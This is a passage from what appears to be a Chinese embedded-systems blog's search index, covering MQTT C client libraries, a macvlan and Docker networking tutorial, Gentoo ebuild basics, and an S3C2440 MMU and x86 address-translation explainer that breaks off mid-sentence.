printf(&quot;Payload %.*s\\n&quot;, (int)message.payloadlen, (char*)message.payload);&#125;int main(int argc, char* argv[])&#123; IPStack ipstack = IPStack(); float version = 0.3; const char* topic = &quot;mbed-sample&quot;; printf(&quot;Version is %f\\n&quot;, version); MQTT::Client client = MQTT::Client(ipstack); const char* hostname = &quot;iot.eclipse.org&quot;; int port = 1883; printf(&quot;Connecting to %s:%d\\n&quot;, hostname, port); int rc = ipstack.connect(hostname, port); if (rc != 0) printf(&quot;rc from TCP connect is %d\\n&quot;, rc); printf(&quot;MQTT connecting\\n&quot;); MQTTPacket_connectData data = MQTTPacket_connectData_initializer; data.MQTTVersion = 3; data.clientID.cstring = (char*)&quot;mbed-icraggs&quot;; rc = client.connect(data); if (rc != 0) printf(&quot;rc from MQTT connect is %d\\n&quot;, rc); printf(&quot;MQTT connected\\n&quot;); rc = client.subscribe(topic, MQTT::QOS2, messageArrived); if (rc != 0) printf(&quot;rc from MQTT subscribe is %d\\n&quot;, rc); MQTT::Message message; // QoS 0 char buf[100]; sprintf(buf, &quot;Hello World! QoS 0 message from app version %f&quot;, version); message.qos = MQTT::QOS0; message.retained = false; message.dup = false; message.payload = (void*)buf; message.payloadlen = strlen(buf)+1; rc = client.publish(topic, message); if (rc != 0) printf(&quot;Error %d from sending QoS 0 message\\n&quot;, rc); else while (arrivedcount == 0) client.yield(100); rc = client.unsubscribe(topic); if (rc != 0) printf(&quot;rc from unsubscribe was %d\\n&quot;, rc); rc = client.disconnect(); if (rc != 0) printf(&quot;rc from disconnect was %d\\n&quot;, rc); ipstack.disconnect(); return 0;&#125; libmosquitto libmosquitto 是 C 语言共享库，可以创建 MQTT 客户端程序。所有的 API 函数都有 mosquitto_ 前缀。 123456789101112// 获取库的版本信息，返回到三个参数中int mosquitto_lib_version(int *major,int *minor,int *revision)// 初始化和清除int mosquitto_lib_init(); int mosquitto_lib_cleanup(); // 新建一个 mosquitto 客户端对象，并返回 struct mosquittostruct mosquitto *mosquitto_new(const char *id, bool clean_session, void *userdata); // 释放一个 mosquitto 客户端对象void mosquitto_destroy(struct mosquitto *mosq); libemqtt 1.Embedded C client library for the MQTT protocol. It also provides a binding for Python.2.编译12345// C Library$ make// Python binding$ make python wolfMQTT This is an implementation of the MQTT Client written in C for embedded use, which supports SSL/TLS via the wolfSSL library. This library was built from the ground up to be multi-platform, space conscience and extensible. Integrates with wolfSSL to provide TLS support. Example code 1234567891011121314151617181920// This is where the top level application interfaces for the MQTT client reside.int MqttClient_Init(MqttClient *client, MqttNet *net, MqttMsgCb msg_cb, byte *tx_buf, int tx_buf_len, byte *rx_buf, int rx_buf_len, int cmd_timeout_ms);// These API&apos;s are blocking on MqttNet.read until error/timeout (cmd_timeout_ms):int MqttClient_Connect(MqttClient *client, MqttConnect *connect);int MqttClient_Publish(MqttClient *client, MqttPublish *publish);int MqttClient_Subscribe(MqttClient *client, MqttSubscribe *subscribe);int MqttClient_Unsubscribe(MqttClient *client, MqttUnsubscribe *unsubscribe);int MqttClient_Ping(MqttClient *client);int MqttClient_Disconnect(MqttClient *client);// This function blocks waiting for a new publish message to arrive for a maximum duration of timeout_ms.int MqttClient_WaitMessage(MqttClient *client, MqttMessage *message, int timeout_ms);// These are the network connect / disconnect interfaces that wrap the MqttNet callbacks and handle WolfSSL TLS:int MqttClient_NetConnect(MqttClient *client, const char* host, word16 port, int timeout_ms, int use_tls, MqttTlsCb cb);int MqttClient_NetDisconnect(MqttClient *client);// Helper functions:const char* MqttClient_ReturnCodeToString(int return_code);","categories":[{"name":"EMBEDDED","slug":"EMBEDDED","permalink":"http://demonelf.github.io/categories/EMBEDDED/"}],"tags":[]},{"title":"linux 下jansson安装和使用","slug":"EMBEDDED/linux 下jansson安装和使用","date":"2017-07-12T07:19:06.000Z","updated":"2017-07-12T07:23:40.376Z","comments":true,"path":"EMBEDDED/linux 下jansson安装和使用.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/linux 下jansson安装和使用.html","excerpt":"http://www.cnblogs.com/etangyushan/p/3724017.html","text":"http://www.cnblogs.com/etangyushan/p/3724017.html","categories":[{"name":"EMBEDDED","slug":"EMBEDDED","permalink":"http://demonelf.github.io/categories/EMBEDDED/"}],"tags":[]},{"title":"JSON的简单介绍以及C语言的JSON库使用","slug":"EMBEDDED/JSON的简单介绍以及C语言的JSON库使用","date":"2017-07-12T05:46:55.000Z","updated":"2017-07-12T05:53:22.816Z","comments":true,"path":"EMBEDDED/JSON的简单介绍以及C语言的JSON库使用.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/JSON的简单介绍以及C语言的JSON库使用.html","excerpt":"http://www.cnblogs.com/liunianshiwei/p/6087596.html","text":"http://www.cnblogs.com/liunianshiwei/p/6087596.html","categories":[{"name":"EMBEDDED","slug":"EMBEDDED","permalink":"http://demonelf.github.io/categories/EMBEDDED/"}],"tags":[]},{"title":"Hello World","slug":"LIVE/hello-world","date":"2017-07-10T01:54:43.497Z","updated":"2017-07-10T02:35:03.583Z","comments":true,"path":"LIVE/hello-world.html","link":"","permalink":"http://demonelf.github.io/LIVE/hello-world.html","excerpt":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you c","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[{"name":"LIVE","slug":"LIVE","permalink":"http://demonelf.github.io/categories/LIVE/"}],"tags":[]},{"title":"S3C2440之存储控制器(sdram)","slug":"EMBEDDED/S3C2440之存储控制器(sdram)","date":"2017-06-16T06:08:11.000Z","updated":"2017-07-10T02:01:05.165Z","comments":true,"path":"EMBEDDED/S3C2440之存储控制器(sdram).html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/S3C2440之存储控制器(sdram).html","excerpt":"[embeddoc url=”http://www.dnsnat.com/share/doc/S3C2440之存储控制器(sdram).docx“ download=”all” viewer=”microsoft”]","text":"[embeddoc url=”http://www.dnsnat.com/share/doc/S3C2440之存储控制器(sdram).docx“ download=”all” viewer=”microsoft”]","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"linux 网络虚拟化： macvlan","slug":"EMBEDDED/linux 网络虚拟化： macvlan","date":"2017-05-18T05:22:34.000Z","updated":"2017-07-10T08:53:26.255Z","comments":true,"path":"EMBEDDED/linux 网络虚拟化： macvlan.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/linux 网络虚拟化： macvlan.html","excerpt":"macvlan 简介 macvlan 是 linux kernel 比较新的特性，可以通过以下方法判断当前系统是否支持： $ modprobe macvlan $ lsmod | grep macvlan macvlan 19046 0","text":"macvlan 简介 macvlan 是 linux kernel 比较新的特性，可以通过以下方法判断当前系统是否支持： $ modprobe macvlan $ lsmod | grep macvlan macvlan 19046 0 如果第一个命令报错，或者第二个命令没有返回，则说明当前系统不支持 macvlan，需要升级系统或者升级内核。 macvlan 允许你在主机的一个网络接口上配置多个虚拟的网络接口，这些网络 interface 有自己独立的 mac 地址，也可以配置上 ip 地址进行通信。macvlan 下的虚拟机或者容器网络和主机在同一个网段中，共享同一个广播域。macvlan 和 bridge 比较相似，但因为它省去了 bridge 的存在，所以配置和调试起来比较简单，而且效率也相对高。除此之外，macvlan 自身也完美支持 VLAN。 如果希望容器或者虚拟机放在主机相同的网络中，享受已经存在网络栈的各种优势，可以考虑 macvlan。 各个 linux 发行版对 macvlan 的支持 macvlan 对kernel 版本依赖：Linux kernel v3.9–3.19 and 4.0+。几个重要发行版支持情况： ubuntu：&gt;= saucy(13.10) RHEL(Red Hat Enterprise Linux): &gt;= 7.0(3.10.0) Fedora: &gt;=19(3.9) Debian: &gt;=8(3.16) 各个发行版的 kernel 都可以自行手动升级，具体操作可以参考官方提供的文档。 以上版本信息参考了这些资料： List of ubuntu versions with corresponding linux kernel version Red Hat Enterprise Linux Release Dates 四种模式 private mode：过滤掉所有来自其他 macvlan 接口的报文，因此不同 macvlan 接口之间无法互相通信 vepa(Virtual Ethernet Port Aggregator) mode： 需要主接口连接的交换机支持 VEPA/802.1Qbg 特性。所有发送出去的报文都会经过交换机，交换机作为再发送到对应的目标地址（即使目标地址就是主机上的其他 macvlan 接口），也就是 hairpin mode 模式，这个模式用在交互机上需要做过滤、统计等功能的场景。 bridge mode：通过虚拟的交换机讲主接口的所有 macvlan 接口连接在一起，这样的话，不同 macvlan 接口之间能够直接通信，不需要将报文发送到主机之外。这个模式下，主机外是看不到主机上 macvlan interface 之间通信的报文的。 passthru mode：暂时没有搞清楚这个模式要解决的问题 VEPA 和 passthru 模式下，两个 macvlan 接口之间的通信会经过主接口两次：第一次是发出的时候，第二次是返回的时候。这样会影响物理接口的宽带，也限制了不同 macvlan 接口之间通信的速度。如果多个 macvlan 接口之间通信比较频繁，对于性能的影响会比较明显。 private 模式下，所有的 macvlan 接口都不能互相通信，对性能影响最小。 bridge 模式下，数据报文是通过内存直接转发的，因此效率会高一些，但是会造成 CPU 额外的计算量。 NOTE：如果要手动分配 mac 地址，请注意本地的 mac 地址最高位字节的低位第二个 bit 必须是 1。比如 02:xx:xx:xx:xx:xx。 实验 为了方便演示，我们会创建出来两个 macvlan 接口，分别放到不同的 network namespace 里。整个实验的网络拓扑结构如下： 图片来源 首先还是创建两个 network namespace： [root@localhost ~]# ip netns add net1 [root@localhost ~]# ip netns add net2 然后创建 macvlan 接口: [root@localhost ~]# ip link add link enp0s8 mac1 type macvlan [root@localhost ~]# ip link 23: mac1@enp0s8: &lt;BROADCAST,MULTICAST&gt; mtu 1500 qdisc noop state DOWN mode DEFAULT link/ether e2:80:1c:ba:59:9c brd ff:ff:ff:ff:ff:ff 创建的格式为 ip link add link &lt;PARENT&gt; &lt;NAME&gt; type macvlan，其中 &lt;PARENT&gt; 是 macvlan 接口的父 interface 名称，&lt;NAME&gt; 是新建的 macvlan 接口的名称，这个名字可以任意取。使用 ip link 可以看到我们刚创建的 macvlan 接口，除了它自己的名字之外，后面还跟着父接口的名字。 下面就是把创建的 macvlan 放到 network namespace 中，配置好 ip 地址，然后启用它： [root@localhost ~]# ip link set mac1@enp0s8 netns net1 Cannot find device “mac1@enp0s8” [root@localhost ~]# ip link set mac1 netns net1 [root@localhost ~]# ip netns exec net1 ip link 23: mac1@if3: &lt;BROADCAST,MULTICAST&gt; mtu 1500 qdisc noop state DOWN mode DEFAULT link/ether e2:80:1c:ba:59:9c brd ff:ff:ff:ff:ff:ff [root@localhost ~]# ip netns exec net1 ip link set mac1 name eth0 [root@localhost ~]# ip netns exec net1 ip link 23: eth0@if3: &lt;BROADCAST,MULTICAST&gt; mtu 1500 qdisc noop state DOWN mode DEFAULT link/ether e2:80:1c:ba:59:9c brd ff:ff:ff:ff:ff:ff [root@localhost ~]# ip netns exec net1 ip addr add 192.168.8.120/24 dev eth0 [root@localhost ~]# ip netns exec net1 ip link set eth0 up 同理可以配置另外一个 macvlan 接口，可以测试两个 ip 的连通性： [root@localhost ~]# docker exec 1444 ping -c 3 192.168.8.120 PING 192.168.8.120 (192.168.8.120): 56 data bytes 64 bytes from 192.168.8.120: seq=0 ttl=64 time=0.130 ms 64 bytes from 192.168.8.120: seq=1 ttl=64 time=0.099 ms 64 bytes from 192.168.8.120: seq=2 ttl=64 time=0.083 ms — 192.168.8.120 ping statistics — 3 packets transmitted, 3 packets received, 0% packet loss round-trip min/avg/max = 0.083/0.104/0.130 ms 在 docker 中的使用 docker1.12 版本也正式支持了 macvlan 和 ipvlan 网络模式。 创建 macvlan 网络 管理 macvlan 和其他类型的网络类似，通过 docker network 子命令就能实现。创建 macvlan 网络的时候，需要知道主机的网段和网关地址，虚拟网络要依附的物理网卡。 [root@localhost ~]# docker network create -d macvlan –subnet=192.168.8.0/24 –gateway=192.168.8.1 -o parent=enp0s8 mcv 9fad35e54a2f53c9314626f89cf8a705799ed382ddac01c865be1f4d04fdcb8f [root@localhost ~]# docker network ls NETWORK ID NAME DRIVER SCOPE e06b6e00dd3b bridge bridge local 823b7bb07c41 host host local 9fad35e54a2f mcv macvlan local dc7c667aca19 none null local 选项说明： subnet：网络 CIDR 地址 gateway：网关地址 aux-address：不要分配给容器的 ip 地址。字典，以 key=value 对出现 ip-range：指定具体的 ip 分配区间，也是 CIDR 格式，必须是 subnet 指定范围的子集 opt(o)：和 macvlan driver 相关的选项，以 key=value 的格式出现 * &lt;div style=&quot;background: white&quot;&gt;&lt;span style=&quot;color:#222222; font-size:12pt&quot;&gt;&lt;span style=&quot;font-family:Arial&quot;&gt;parent=eth0: &lt;/span&gt;&lt;span style=&quot;font-family:宋体&quot;&gt;指定&lt;/span&gt;&lt;span style=&quot;font-family:Arial&quot;&gt; parent interface macvlan_mode：macvlan 模式，默认是 bridge 运行容器 创建好网络之后，我们就可以使用刚创建的网络运行两个容器，测试网络的连通性。 [root@localhost ~]# docker run –net=mac192 -d –rm alpine top 5e950cf86cda7b4e6fc4bd869834943edacaaf969051293021c75330bbc18b53 [root@localhost ~]# docker run –net=mac192 -d –rm alpine top 9067c54aac79e65b3193a137e95a180a7e5cc4a2845cc664f53c17a244be3853 [root@localhost ~]# docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 9067c54aac79 alpine “top” 7 seconds ago Up 6 seconds sharp_hodgkin 5e950cf86cda alpine “top” 8 seconds ago Up 7 seconds peaceful_chandrasekhar [root@localhost ~]# docker exec 906 ip addr 1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever 16: eth0@if3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN&gt; mtu 1500 qdisc noqueue state UNKNOWN link/ether 02:42:c0:a8:08:03 brd ff:ff:ff:ff:ff:ff inet 192.168.8.3/24 scope global eth0 valid_lft forever preferred_lft forever inet6 fe80::42:c0ff:fea8:803/64 scope link valid_lft forever preferred_lft forever [root@localhost ~]# docker exec 5e9 ping -c 3 192.168.8.3 PING 192.168.8.3 (192.168.8.3): 56 data bytes 64 bytes from 192.168.8.3: seq=0 ttl=64 time=0.226 ms 64 bytes from 192.168.8.3: seq=1 ttl=64 time=0.076 ms 64 bytes from 192.168.8.3: seq=2 ttl=64 time=0.095 ms — 192.168.8.3 ping statistics — 3 packets transmitted, 3 packets received, 0% packet loss round-trip min/avg/max = 0.076/0.132/0.226 ms 需要注意的是，从容器中是无法访问所在主机地址的： [root@localhost ~]# docker exec 5e9 ping -c 3 192.168.8.110 PING 192.168.8.110 (192.168.8.110): 56 data bytes — 192.168.8.110 ping statistics — 3 packets transmitted, 0 packets received, 100% packet loss 这是 macvlan 的特性，目的是为了更好地实现网络的隔离，和 docker 无关。 参考资料 Macvlan and IPvlan basics docker docs: Getting started with macvlan network driver bridge vs macvlan comments powered by Disqus","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"ebuild文件阅读和撰写方法简介","slug":"EMBEDDED/ebuild文件阅读和撰写方法简介","date":"2017-04-12T07:37:35.000Z","updated":"2017-07-10T08:48:49.891Z","comments":true,"path":"EMBEDDED/ebuild文件阅读和撰写方法简介.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/ebuild文件阅读和撰写方法简介.html","excerpt":"ebuild文件是portage系统的一部分，它是一种采用bash脚本语法书写的脚本文件，当使用portage相关工具维护系统中的软件时，针对单个软件的下载、安装等动作会由对应的ebuild脚本完成 关于ebuild文件，之前俺无任何撰写经验，偶尔会因需","text":"ebuild文件是portage系统的一部分，它是一种采用bash脚本语法书写的脚本文件，当使用portage相关工具维护系统中的软件时，针对单个软件的下载、安装等动作会由对应的ebuild脚本完成 关于ebuild文件，之前俺无任何撰写经验，偶尔会因需要了解下载地址或post-installation message等原因查阅相关ebuild文件，下午略略阅读了gentoo的官方文档，在此简略记录关于ebuild的阅读和撰写方法的相关内容。 如前述，ebuild是采用bash语法书写的脚本文件，ebuild与portage系统的关系是典型的script与host的关系，其构架可类比”js与web客户端应用”，即host完成控制、协调、提供功能等任务，script使用host提供的功能、采用某种形式与host交互、提供定制化能力。当portage系统需要操作某个包时，它与对应ebuild文件的交互方式大体是： 1、portage系统在运行ebuild脚本之前，对某些”特定名字的环境变量”（其后详述）赋值，当运行ebuild脚本时，脚本可读取这些环境变量，了解相关信息2、ebuild脚本对一些”特定名字的环境变量”（其后详述）赋值，描述（即告知portage系统）本包的相关信息3、ebuild脚本定义”特定名字的函数”（其后详述），实现相关子过程的接管和控制。在需要的时候，portage系统将调用ebuild中定义的这些函数完成相关操作 一个典型的”包安装”过程如下图：图中的框内函数由ebuild脚本定义，而框间的流程，由portage系统控制 portage系统与ebuild交互的细节（ebuild格式、环境接口、函数接口、调用过程等）称为Package Manager Specification（PMS）。EAPI的值是pms的版本，由于各版本的pms可能在ebuild与portage系统的交互上存在不兼容性，因此，ebuild通过指定EAPI（由ebuild为EAPI赋值）的方式通知portage系统期望使用的pms版本。 ebuild文件被推荐使用tab作为缩进符，行字符数小于80，采用utf8编码 pms预定义的环境变量包括： 只读变量（由portage系统赋值，描述当前包的信息，ebuild文件读取使用）：P：带版本号的包名PN：包名PV：版本号PR：revisionPVR：版本号及revisionPF：包全名A：包全部源文件CATEGORY：包类别FILESDIR：包portage目录中的files子目录全路径WORKDIR：build目录T：临时目录D：临时安装目录ROOT：根目录DISTDIR：包文件下载目录 ebuild可写环境变量（由ebuild赋值，portage读取并获取相关包信息）：EAPI：ebuild期望使用的pms版本号DESCRIPTION：包描述HOMEPAGE：包主页SRC_URI：包所需文件下载路径，可以和use条件判断结合使用LICENSE：包license需求SLOT：包所在slot定义KEYWORDS：包支持keywords需求IUSE：包支持的所有use列表RESTRICT：feature需求列表DEPEND：包编译依赖RDEPEND：包执行依赖PDEPEND：包安装依赖S：临时编译路径 ebuild可实现函数（ebuild定义，portage系统调用。详情请查阅手册）：pkg_pretendpkg_nofetchpkg_setupsrc_unpacksrc_preparesrc_configuresrc_compilesrc_testsrc_installpkg_preinstpkg_postinstpkg_prermpkg_postrmpkg_configpkg_info portage也提供了必要的功能函数供ebuild使用，如：1、enewgroup、enewuser操作users和groups2、elog、einfo、ewarn输出信息3、一组预定义的函数定义，组织完备后存储在portage/eclass目录下，可使用inherit函数导入eclass并使用其中函数 草草介绍了下，侧重原理，省略细节。如果有撰写ebuild需求，应精读之前提到的官方文档：http://devmanual.gentoo.org gentoo 编写 ebuild举例： http://www.tuicool.com/articles/MVRz2a","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"S3C2440之内存管理单元MMU","slug":"EMBEDDED/S3C2440之内存管理单元MMU","date":"2017-02-14T02:23:38.000Z","updated":"2017-07-10T08:51:30.660Z","comments":true,"path":"EMBEDDED/S3C2440之内存管理单元MMU.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/S3C2440之内存管理单元MMU.html","excerpt":"一、内存管理单元MMU简介 内存管理单元（Memory Management Unit）简称MMU，它是一块硬件单元，类似于存储控制器，它负责虚拟地址到物理地址的映射，并提供硬件机制的内存访问授权。 MMU可以使每个用户进程都拥有独立的地址空间，同时","text":"一、内存管理单元MMU简介 内存管理单元（Memory Management Unit）简称MMU，它是一块硬件单元，类似于存储控制器，它负责虚拟地址到物理地址的映射，并提供硬件机制的内存访问授权。 MMU可以使每个用户进程都拥有独立的地址空间，同时，内存访问权限的检查可以保护每个进程所用的内存不会被其他进程破坏。 早期的计算机由于性能低下，所用的程序是非常小的，可以全部装入内存中，随着技术的发展，物理内存无法满足应用程序的要求，所以引入了虚拟存储器。 虚拟存储器从逻辑上对内存容量进行扩充，用户看到的大容量只是一种感觉，是虚拟的，在32位的CPU系统中，这个虚拟内存地址的范围为0~0xFFFFFFFF（4GB），我们把这个地址范围称为虚拟地址空间。与虚拟地址空间、虚拟地址相对应的是物理地址空间、物理地址，它们对应实际的内存。 我们在内存中划出一小块空间，用来存储虚拟内存与物理内存之间的映射关系。 如段（Section，1MB）映射，我们使用Excel中的术语来说的话，对于32位CPU，拥有4G的虚拟地址空间，所以只需要4096个单元格，每个单元格占用4Byte，用来描述物理内存的一段（1MB），只需在内存划分出16KB即可 除此至外，还有页（Page）映射方式，页的大小有3种，大页（64KB）、小页（4KB）、极小页（1KB）。 同时，上面所说的单元格，其实在MMU中称作”描述符”，在描述符中，不但保存了段、大页、小页、极小页的其实物理地址，还保存了对应的内存访问权限。 在配置好MMU之后，MMU将开始相应CPU的请求，根据描述符中的内容，做出相应的操作。 同时，为了提供性能和程序的运行速度，还引入了TLB和Cache。 二、X86地址映射原理8086 :逻辑地址-物理地址 80386 :虚拟地址-线性地址-物理地址 Linux采用页式存储管理，进程地址空间被以Page划分,Page默认4KB可以修改。物理内存被划分为相同大小的Page Frame，页帧。x86逻辑地址(VA)段转化(segment translation)后得到线性地址，页转化(page translation)后得到物理地址(PA)。也就是说程序给入一个逻辑地址，CPU拿到后经过两个映射得到数据总线的地址（物理地址）。 借用前辈的图描述IA_32 (属于X86体系结构的32位版本)段页式地址转化(映射)的过程：(image source: http://ilinuxkernel.com/?p=448 ) x86 CPU段机制(Segmentation)可以将程序的代码(Code)、数据(Data)、栈(Stack)分开。使多各进程互不干扰。也就是说，分段机制把虚拟地址空间的一个逻辑地址转换为线性地址空间的一个内存地址。 页机制(Paging)实现以page为需求的虚拟内存系统，在需要时才分配物理内存。页机制也可以隔离多任务。逻辑地址有由页号和偏移量组成。内存被分为N个page，一个Job申请了4个Page，0-3，那么内容逻辑上会以此由0排到3号page，3号page中往往或有浪费空间，内部碎片(internal fragmentation)。然后逻辑上连续的这4个Page会被映射在物理内存的不同位置，不一定顺序或者连续。如图：(image source: http://ilinuxkernel.com/?p=448 ) 具体x86地址映射说明 IA_32提供的寄存器从功能上可分为类：CPU寄存器、系统寄存器。(笔者自己的分类)CPU寄存器IA_32 (属于X86体系结构的32位版本)提供10个32bit，6个16bit寄存器，分三类： 通用寄存器(8* 32bit registers) * &lt;div style=&quot;background: white&quot;&gt;&lt;span style=&quot;color:black&quot;&gt;&lt;span style=&quot;font-family:宋体&quot;&gt;数据寄存器&lt;/span&gt;&lt;span style=&quot;font-family:微软雅黑&quot;&gt; EAX&lt;/span&gt;&lt;span style=&quot;font-family:宋体&quot;&gt;、&lt;/span&gt;&lt;span style=&quot;font-family:微软雅黑&quot;&gt;EBX&lt;/span&gt;&lt;span style=&quot;font-family:宋体&quot;&gt;、&lt;/span&gt;&lt;span style=&quot;font-family:微软雅黑&quot;&gt;ECX&lt;/span&gt;&lt;span style=&quot;font-family:宋体&quot;&gt;、&lt;/span&gt;&lt;span style=&quot;font-family:微软雅黑&quot;&gt;EDX 索引(变址)寄存器 ESI、EDI - 字符串处理指令相关 指针寄存器 ESP(Stack Pointer,当前栈顶)、EBP(Base Pointer,当前栈底) - 维护栈 控制寄存器(2* 32bit registers) * &lt;div style=&quot;background: white&quot;&gt;&lt;span style=&quot;color:black&quot;&gt;&lt;span style=&quot;font-family:微软雅黑&quot;&gt;EIP&lt;/span&gt;&lt;span style=&quot;font-family:宋体&quot;&gt;，&lt;/span&gt;&lt;span style=&quot;font-family:微软雅黑&quot;&gt;Instruction Pointer&lt;/span&gt;&lt;span style=&quot;font-family:宋体&quot;&gt;，跟踪下一条要执行的指令，也称程序计数寄存器&lt;/span&gt;&lt;span style=&quot;font-family:微软雅黑&quot;&gt; &lt;/span&gt;&lt;/span&gt;&lt;/div&gt; EFLAGS，Program Status and Control Register 段寄存器(6* 16bit registers) * &lt;div style=&quot;background: white&quot;&gt;&lt;span style=&quot;color:black; font-family:微软雅黑&quot;&gt;CS\\ES\\DS\\FS\\GS\\SS 注：32bit架构中有6个段寄存器所以最多可以同时访问6个段。 注：在之后介绍两种CPU运行模式下段寄存器功能的变化。 系统寄存器初始化CPU和控制系统的相关操作，用到的寄存器。与EFLAGS寄存器也有关。 EFLAG的IOPL 控制寄存器 * &lt;div style=&quot;background: white&quot;&gt;&lt;span style=&quot;color:black&quot;&gt;&lt;span style=&quot;font-family:微软雅黑&quot;&gt;CR0&lt;/span&gt;&lt;span style=&quot;font-family:宋体&quot;&gt;、&lt;/span&gt;&lt;span style=&quot;font-family:微软雅黑&quot;&gt;CR2&lt;/span&gt;&lt;span style=&quot;font-family:宋体&quot;&gt;、&lt;/span&gt;&lt;span style=&quot;font-family:微软雅黑&quot;&gt;CR3&lt;/span&gt;&lt;span style=&quot;font-family:宋体&quot;&gt;、&lt;/span&gt;&lt;span style=&quot;font-family:微软雅黑&quot;&gt;CR4 - &lt;/span&gt;&lt;span style=&quot;font-family:宋体&quot;&gt;系统级别，&lt;/span&gt;&lt;span style=&quot;font-family:微软雅黑&quot;&gt;CPU&lt;/span&gt;&lt;span style=&quot;font-family:宋体&quot;&gt;特殊功能&lt;/span&gt;&lt;span style=&quot;font-family:微软雅黑&quot;&gt; &lt;/span&gt;&lt;/span&gt;&lt;/div&gt; 系统描述表寄存器 - 只能在保护模式下使用 * &lt;div style=&quot;background: white&quot;&gt;&lt;span style=&quot;color:black&quot;&gt;&lt;span style=&quot;font-family:微软雅黑&quot;&gt;GDTR(&lt;/span&gt;&lt;span style=&quot;font-family:宋体&quot;&gt;全局描述表寄存器&lt;/span&gt;&lt;span style=&quot;font-family:微软雅黑&quot;&gt; - GDT Entry&lt;/span&gt;&lt;span style=&quot;font-family:宋体&quot;&gt;线性基地址&lt;/span&gt;&lt;span style=&quot;font-family:微软雅黑&quot;&gt;) LDTR(局部描述表寄存器 - 进程自己LDT的 段描述符) IDTR(中断描述表寄存器) (image source: http://ilinuxkernel.com/?p=1276 ) 任务寄存器 TR(Linux 没有使用) 调试寄存器 DR0~DR7 * &lt;div style=&quot;background: white&quot;&gt;&lt;span style=&quot;color:black&quot;&gt;&lt;span style=&quot;font-family:宋体&quot;&gt;如&lt;/span&gt;&lt;span style=&quot;font-family:微软雅黑&quot;&gt;DR7&lt;/span&gt;&lt;span style=&quot;font-family:宋体&quot;&gt;是断点控制寄存器&lt;/span&gt;&lt;span style=&quot;font-family:微软雅黑&quot;&gt; &lt;/span&gt;&lt;/span&gt;&lt;/div&gt; 测试寄存器 TR0~TR7 如图：(image source: http://ilinuxkernel.com/?p=1276 ) 工作模式IA_32有两种工作模式：实模式，保护模式。（有兴趣可以看一个贴，关于“[寻访x86处理器“实模式“和“保护模式“的前世今生“）实模式下：前4个段寄存器CS、DS、ES和SS与先前CPU中的所对应的段寄存器的含义完全一致，内存单元的逻辑地址仍为“段值：偏移量“(Segment:Offset)的形式。为访问某内存段内的数据，必须使用该段寄存器和存储单元的偏移量。比如分别用CS(Code Segment), DS(Data Segment), SS(Stack Sagmet)来描述进程的代码段，数据段，堆栈段，然后用其中某个地址，如要访问堆栈数据，将SS数据左移4bit + Offset(DI)就是实际要访问的虚拟地址。 实模式由16位段寄存器做段基地址，和6位偏移地址形成20位的物理地址，最大寻址空间1MB，最大分段Limit 64KB。可以使用32位指令。在实模式下，所有的段都是可以读、写和可执行的。所以这种模式直接算出来的就是物理地址。 保护模式下：顾名思义要对内存空间做保护，不能像实模式那样随意访问。得到的是虚拟地址，需要再进行转化才能得到物理地址。段寄存器装入的不是段地址。新的模式需要描述基地址、长度、权限等等来做保护，使用一64bit的数据结构](http://blog.chinaunix.net/uid-23069658-id-3569341.html) - 段描述符Selector。为了用16bit的寄存器来访问这个数据结构的信息，将这些64bit的段描述符放在一个数组中，将段寄存器的值作为下标索引间访问。上面提到的数组就是GDT(Global Descriptor Table)，GDT不但存有段描述符，还有其他64bit描述符。 GDT(Global Descriptor Table)可以放在内存任何位置，知道入口就可以。所以Intel设计了寄存器GDTR，存放GDT入口地址，通过LGDT指令装入(32bit线性地址+16bit Limit如上描述表寄存器图)。之后CPU根据GDTR来访问GDT。GDT只有一个。 GDT需要8Byte对齐，第一个描述符全0。每个CPU一个GDT。 LDT(Local Descriptor Table)与GDT结构类似，不过可以存在多个，非全局可见，只对任务可见。每个任务至多有一个。LDT自身作为一个段存在，段描述符放在GDT中。进程需要通过LLDT指令(操作数是16bit Selector，GDT中所要LDT的索引)将LDT的段描述符装入LDTR，进而访问自己的LDR。Linux事实上没有用到LDT。Segment Descriptor: 64bit in GDT/LDTSegment Selector, 段选择子，高13 bit是GDT/LDT下标索引，+ 1 bit 处于GDT or LDT + 2 bit特权请求等级。 保护模式具体的还有有两种模式：段式，段页式。 段式IA_32允许将段基地址用任何32bit能表示的值描述，Limit为32bit能表示的2^12的倍数的任何值(4K,Page的倍数)。在保护模式找到所需物理地址的过程是： 1. &lt;div style=&quot;background: white&quot;&gt;&lt;span style=&quot;color:black&quot;&gt;&lt;span style=&quot;font-family:宋体&quot;&gt;段寄存器装入&lt;/span&gt;&lt;span style=&quot;font-family:微软雅黑&quot;&gt;Selector 用这个Selector做索引在GDT/LDT中找到相应的段描述符 取出64bit描述符中记录目标段的的Base Address (+越界越权查看) 用Base Address + 